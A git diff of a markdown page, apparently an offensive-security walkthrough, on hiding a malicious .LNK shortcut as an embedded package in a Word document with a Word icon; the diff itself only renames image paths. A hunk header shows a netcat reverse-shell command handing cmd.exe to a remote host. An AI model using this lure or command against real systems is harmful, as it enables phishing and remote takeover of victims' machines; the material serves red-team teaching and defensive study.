@@ -30,7 +30,7 @@ C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
 
 Once the above powershell script is executed, an `.LNK` shortcut is created
 
-![](<../../.gitbook/assets/image (23).png>)
+![](<../../.gitbook/assets/image (23) (1).png>)
 
 Let's create a Word document that will contain the malicious shortcut that was created in the previous step:
 
@@ -38,9 +38,9 @@ Let's create a Word document that will contain the malicious shortcut that was c
 
 Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:
 
-![](<../../.gitbook/assets/image (21).png>)
+![](<../../.gitbook/assets/image (21) (1).png>)
 
-![](<../../.gitbook/assets/image (31).png>)
+![](<../../.gitbook/assets/image (31) (1).png>)
 
 Point the package to the .lnk file containing the payload:
 
@@ -48,7 +48,7 @@ Point the package to the .lnk file containing the payload:
 
 Final result:
 
-![](<../../.gitbook/assets/image (12).png>)
+![](<../../.gitbook/assets/image (12) (1).png>)
 
 Victim executing the embedded document. Gets presented with a popup to confirm execution:
 
@@ -56,4 +56,4 @@ Victim executing the embedded document. Gets presented with a popup to confirm e
 
 Once the victim confirms they want to open the file - the reverse shell comes back to the attacker:
 
-![](<../../.gitbook/assets/image (42).png>)
+![](<../../.gitbook/assets/image (42) (1).png>)
